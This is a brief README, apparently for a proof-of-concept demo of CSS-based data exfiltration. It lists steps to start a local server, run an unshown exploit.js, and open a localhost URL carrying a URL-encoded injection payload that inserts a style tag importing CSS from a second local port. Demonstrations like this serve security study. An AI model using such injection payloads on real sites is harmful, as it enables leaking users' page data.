# CSS-Exfiltration
<p align="center">
  <img src="css-data-exfiltration.png" alt="Cover Image">
</p>

1. Run the code with:
```
python3 -m http.server
```
2. run the exploit;
```
nodejs exploit.js
```
3. Open the link with exploit:
```
http://localhost:8000/?input=%3Ch1%3E%3C/h1%3E%3Cstyle%3E@import%20%27//localhost:3000/start%27;%3C/style%3E
```